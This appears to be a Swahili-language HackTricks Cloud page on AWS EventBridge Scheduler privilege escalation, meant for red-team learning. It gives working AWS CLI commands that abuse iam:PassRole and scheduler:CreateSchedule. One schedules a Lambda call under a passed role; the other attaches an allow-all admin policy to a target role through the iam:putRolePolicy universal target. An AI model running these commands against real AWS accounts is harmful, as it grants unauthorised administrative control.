# AWS - EventBridge Scheduler Privesc

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## EventBridge Scheduler

EventBridge Scheduler inaweza kutumika kwa ajili ya kupandisha hadhi kwa kupanga simu kwa huduma mbalimbali za AWS. Kwa kutumia uwezo wake wa kuita huduma kwa msingi wa ratiba, watumiaji wenye ruhusa za kutosha wanaweza kupandisha hadhi. Hapa kuna baadhi ya hatua muhimu ambazo EventBridge Scheduler inaweza kuchochea kwa kutumia malengo yaliyotengenezwa:

* Lambda: lambda:InvokeFunction - Kuita kazi za Lambda kwa ratiba.
* CodeBuild: codebuild:StartBuild - Anza miradi ya AWS CodeBuild.
* CodePipeline: codepipeline:StartPipelineExecution - Chochea utekelezaji wa AWS CodePipeline.
* ECS: ecs:RunTask - Endesha kazi za ECS.
* EventBridge: events:PutEvents - Weka matukio ndani ya EventBridge.
* Inspector: inspector:StartAssessmentRun - Anza tathmini za Amazon Inspector.
* Kinesis: kinesis:PutRecord - Weka rekodi ndani ya Kinesis streams.
* Firehose: firehose:PutRecord - Weka rekodi ndani ya Firehose delivery streams.
* SageMaker: sagemaker:StartPipelineExecution - Anza utekelezaji wa SageMaker pipeline.
* SNS: sns:Publish - Chapisha ujumbe kwenye mada za SNS.
* SQS: sqs:SendMessage - Tuma ujumbe kwenye foleni za SQS.
* Step Functions: states:StartExecution - Anza utekelezaji wa AWS Step Functions.

Hizi ni baadhi tu ya hatua zilizotengenezwa ambazo EventBridge Scheduler inaweza kutekeleza. Hata hivyo, kwa kutumia malengo ya ulimwengu wote, hatua nyingi nyingine katika huduma za AWS zinaweza kuitwa. Malengo ya ulimwengu wote yanaruhusu operesheni za API zaidi ya orodha iliyotengenezwa.

Maelezo zaidi kuhusu EventBridge Scheduler katika:

{% content-ref url="../aws-services/eventbridgescheduler-enum.md" %}
[eventbridgescheduler-enum.md](../aws-services/eventbridgescheduler-enum.md)
{% endcontent-ref %}

### `iam:PassRole`, (`scheduler:CreateSchedule` | `scheduler:UpdateSchedule`)

Watumiaji wenye ruhusa za `sts:AssumeRole`, `iam:PassRole`, na `scheduler:CreateSchedule or scheduler:UpdateSchedule` wanaweza kupandisha hadhi kwa kutumia EventBridge Scheduler kuitisha huduma kwa kutumia jukumu lenye hadhi ya juu.

Kwa ruhusa hizi, mshambuliaji anaweza kuchukua jukumu lenye hadhi ya juu na kupitisha jukumu hilo kwa EventBridge Scheduler wakati wa kuunda au kuboresha ratiba. Ratiba inaweza kuandaliwa ili kutekeleza yoyote ya hatua zilizoorodheshwa hapo awali, kama vile kuita kazi za Lambda, kuanzisha kazi za ECS, kuchochea utekelezaji wa CodePipeline, au operesheni yoyote ya huduma 270 za AWS zinazoungwa mkono na EventBridge Scheduler. Kwa kupanga hatua hizi, mshambuliaji anaweza kutumia hadhi ya juu kufanya operesheni zisizoidhinishwa katika huduma za AWS. \\

Kwa mfano, wanaweza kuandaa ratiba kuitisha kazi ya Lambda ambayo ni hatua iliyotengenezwa:
```bash
aws scheduler create-schedule \
--name MyLambdaSchedule \
--schedule-expression "rate(5 minutes)" \
--flexible-time-window "Mode=OFF" \
--target '{
"Arn": "arn:aws:lambda:<region>:<account-id>:function:<LambdaFunctionName>",
"RoleArn": "arn:aws:iam::<account-id>:role/<RoleName>"
}'
```
Mbali na hatua za huduma zilizotengenezwa, unaweza kutumia malengo ya ulimwengu katika EventBridge Scheduler ili kuitisha anuwai kubwa ya operesheni za API kwa huduma nyingi za AWS. Malengo ya ulimwengu yanatoa kubadilika kuitisha karibu kila API. Mfano mmoja unaweza kuwa kutumia malengo ya ulimwengu kuongeza "AdminAccessPolicy", ukitumia jukumu ambalo lina sera ya "putRolePolicy":
```bash
aws scheduler create-schedule \
--name GrantAdminToTargetRoleSchedule \
--schedule-expression "rate(5 minutes)" \
--flexible-time-window "Mode=OFF" \
--target '{
"Arn": "arn:aws:scheduler:::aws-sdk:iam:putRolePolicy",
"RoleArn": "arn:aws:iam::<account-id>:role/RoleWithPutPolicy",
"Input": "{\"RoleName\": \"TargetRole\", \"PolicyName\": \"AdminAccessPolicy\", \"PolicyDocument\": \"{\\\"Version\\\": \\\"2012-10-17\\\", \\\"Statement\\\": [{\\\"Effect\\\": \\\"Allow\\\", \\\"Action\\\": \\\"*\\\", \\\"Resource\\\": \\\"*\\\"}]}\"}"
}'
```
## References

* [https://docs.aws.amazon.com/scheduler/latest/UserGuide/managing-targets-templated.html](https://docs.aws.amazon.com/scheduler/latest/UserGuide/managing-targets-templated.html)
* [https://docs.aws.amazon.com/scheduler/latest/UserGuide/managing-targets-universal.html](https://docs.aws.amazon.com/scheduler/latest/UserGuide/managing-targets-universal.html)

{% hint style="success" %}
Jifunze & fanya mazoezi ya AWS Hacking:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Jifunze & fanya mazoezi ya GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Angalia [**mpango wa usajili**](https://github.com/sponsors/carlospolop)!
* **Jiunge na** üí¨ [**kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **fuata** sisi kwenye **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu za hacking kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
